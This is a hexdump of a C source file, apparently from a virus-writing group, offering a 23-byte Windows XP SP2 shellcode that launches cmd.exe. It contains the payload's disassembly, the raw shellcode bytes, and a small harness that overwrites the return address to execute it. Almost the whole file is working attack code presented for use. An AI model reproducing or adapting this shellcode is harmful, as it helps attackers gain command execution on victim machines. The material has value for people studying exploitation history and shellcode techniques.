00000000  2f 2a 0d 0a 77 69 6e 33  32 2f 78 70 20 73 70 32  |/*..win32/xp sp2|
00000010  20 28 45 6e 20 2b 20 41  72 29 20 63 6d 64 2e 65  | (En + Ar) cmd.e|
00000020  78 65 20 32 33 20 62 79  74 65 73 0d 0a 41 75 74  |xe 23 bytes..Aut|
00000030  68 6f 72 20 3a 20 41 6e  54 69 20 53 65 43 75 52  |hor : AnTi SeCuR|
00000040  65 0d 0a 54 65 61 4d 20  3a 20 53 61 75 44 69 20  |e..TeaM : SauDi |
00000050  56 69 52 75 53 20 54 65  61 4d 0d 0a 45 6d 61 69  |ViRuS TeaM..Emai|
00000060  6c 20 3a 20 41 6e 54 69  2d 53 65 43 75 52 65 40  |l : AnTi-SeCuRe@|
00000070  48 6f 54 4d 61 69 4c 2e  43 6f 4d 0d 0a 53 69 74  |HoTMaiL.CoM..Sit|
00000080  65 20 3a 20 57 77 57 2e  56 78 58 39 2e 43 63 0d  |e : WwW.VxX9.Cc.|
00000090  0a 54 68 78 20 54 6f 20  3a 20 53 74 61 63 6b 20  |.Thx To : Stack |
000000a0  2c 20 53 61 75 44 69 20  56 69 52 75 53 20 54 65  |, SauDi ViRuS Te|
000000b0  61 4d 20 28 20 52 45 4e  4f 20 2d 20 44 72 2e 70  |aM ( RENO - Dr.p|
000000c0  68 70 20 2d 20 21 20 42  61 44 20 42 6f 59 20 21  |hp - ! BaD BoY !|
000000d0  20 2d 20 4a 65 74 6c 69  30 30 37 20 2d 20 47 6f  | - Jetli007 - Go|
000000e0  76 2e 68 61 63 6b 65 72  20 29 0d 0a 44 65 73 63  |v.hacker )..Desc|
000000f0  72 69 70 74 69 6f 6e 20  3a 20 49 74 27 73 20 61  |ription : It's a|
00000100  20 32 33 20 42 79 74 65  20 53 68 65 6c 6c 63 6f  | 23 Byte Shellco|
00000110  64 65 20 77 68 69 63 68  20 45 78 65 63 75 74 65  |de which Execute|
00000120  20 43 6d 64 2e 65 78 65  20 54 65 73 74 65 64 20  | Cmd.exe Tested |
00000130  55 6e 64 65 72 20 57 69  6e 64 6f 77 73 20 58 70  |Under Windows Xp|
00000140  20 53 50 32 20 45 6e 67  6c 69 73 68 20 61 6e 64  | SP2 English and|
00000150  20 61 72 61 62 69 63 20  2e 0d 0a 67 65 74 20 74  | arabic ...get t|
00000160  68 65 20 66 6f 6c 6c 6f  77 69 6e 67 20 69 66 20  |he following if |
00000170  77 65 20 64 69 73 61 73  73 65 6d 6c 65 20 74 68  |we disassemle th|
00000180  69 73 20 63 6f 64 65 20  63 6f 6d 70 69 6c 65 64  |is code compiled|
00000190  20 77 69 74 68 20 6f 6c  6c 79 20 64 65 62 75 67  | with olly debug|
000001a0  67 65 72 0d 0a 20 0d 0a  30 30 34 30 32 30 30 30  |ger.. ..00402000|
000001b0  20 20 3e 20 38 42 45 43  20 20 20 20 20 20 20 20  |  > 8BEC        |
000001c0  20 20 20 20 20 4d 4f 56  20 45 42 50 2c 45 53 50  |     MOV EBP,ESP|
000001d0  0d 0a 30 30 34 30 32 30  30 32 20 20 2e 20 36 38  |..00402002  . 68|
000001e0  20 36 35 37 38 36 35 32  30 20 20 20 20 20 20 50  | 65786520      P|
000001f0  55 53 48 20 32 30 36 35  37 38 36 35 0d 0a 30 30  |USH 20657865..00|
00000200  34 30 32 30 30 37 20 20  2e 20 36 38 20 36 33 36  |402007  . 68 636|
00000210  44 36 34 32 45 20 20 20  20 20 20 50 55 53 48 20  |D642E      PUSH |
00000220  32 45 36 34 36 44 36 33  0d 0a 30 30 34 30 32 30  |2E646D63..004020|
00000230  30 43 20 20 2e 20 38 44  34 35 20 46 38 20 20 20  |0C  . 8D45 F8   |
00000240  20 20 20 20 20 20 20 4c  45 41 20 45 41 58 2c 44  |       LEA EAX,D|
00000250  57 4f 52 44 20 50 54 52  20 53 53 3a 5b 45 42 50  |WORD PTR SS:[EBP|
00000260  2d 38 5d 0d 0a 30 30 34  30 32 30 30 46 20 20 2e  |-8]..0040200F  .|
00000270  20 35 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 50             |
00000280  20 20 50 55 53 48 20 45  41 58 0d 0a 30 30 34 30  |  PUSH EAX..0040|
00000290  32 30 31 30 20 20 2e 20  42 38 20 38 44 31 35 38  |2010  . B8 8D158|
000002a0  36 37 43 20 20 20 20 20  20 4d 4f 56 20 45 41 58  |67C      MOV EAX|
000002b0  2c 6b 65 72 6e 65 6c 33  32 2e 57 69 6e 45 78 65  |,kernel32.WinExe|
000002c0  63 0d 0a 30 30 34 30 32  30 31 35 20 20 2e 20 46  |c..00402015  . F|
000002d0  46 44 30 20 20 20 20 20  20 20 20 20 20 20 20 20  |FD0             |
000002e0  43 41 4c 4c 20 45 41 58  0d 0a 2a 2f 0d 0a 23 69  |CALL EAX..*/..#i|
000002f0  6e 63 6c 75 64 65 20 3c  73 74 64 69 6f 2e 68 3e  |nclude <stdio.h>|
00000300  0d 0a 75 6e 73 69 67 6e  65 64 20 63 68 61 72 20  |..unsigned char |
00000310  73 68 65 6c 6c 63 6f 64  65 5b 5d 20 3d 0d 0a 20  |shellcode[] =.. |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  20 20 20 20 20 20 20 22  5c 78 38 62 5c 78 65 63  |       "\x8b\xec|
00000340  5c 78 36 38 5c 78 36 35  5c 78 37 38 5c 78 36 35  |\x68\x65\x78\x65|
00000350  22 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |"..             |
00000360  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 32 30  |           "\x20|
00000370  5c 78 36 38 5c 78 36 33  5c 78 36 64 5c 78 36 34  |\x68\x63\x6d\x64|
00000380  5c 78 32 65 22 0d 0a 20  20 20 20 20 20 20 20 20  |\x2e"..         |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
000003a0  5c 78 38 64 5c 78 34 35  5c 78 66 38 5c 78 35 30  |\x8d\x45\xf8\x50|
000003b0  5c 78 62 38 5c 78 38 44  22 0d 0a 20 20 20 20 20  |\xb8\x8D"..     |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  20 20 20 22 5c 78 31 35  5c 78 38 36 5c 78 37 43  |   "\x15\x86\x7C|
000003e0  5c 78 66 66 5c 78 64 30  22 3b 0d 0a 69 6e 74 20  |\xff\xd0";..int |
000003f0  6d 61 69 6e 20 28 29 0d  0a 7b 0d 0a 69 6e 74 20  |main ()..{..int |
00000400  2a 72 65 74 3b 0d 0a 72  65 74 3d 28 69 6e 74 20  |*ret;..ret=(int |
00000410  2a 29 26 72 65 74 2b 32  3b 0d 0a 70 72 69 6e 74  |*)&ret+2;..print|
00000420  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 4c 65 6e  |f("Shellcode Len|
00000430  67 74 68 20 69 73 20 3a  20 25 64 5c 6e 22 2c 73  |gth is : %d\n",s|
00000440  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
00000450  29 3b 0d 0a 28 2a 72 65  74 29 3d 28 69 6e 74 29  |);..(*ret)=(int)|
00000460  73 68 65 6c 6c 63 6f 64  65 3b 0d 0a 72 65 74 75  |shellcode;..retu|
00000470  72 6e 20 30 3b 0d 0a 7d                           |rn 0;..}|
00000478
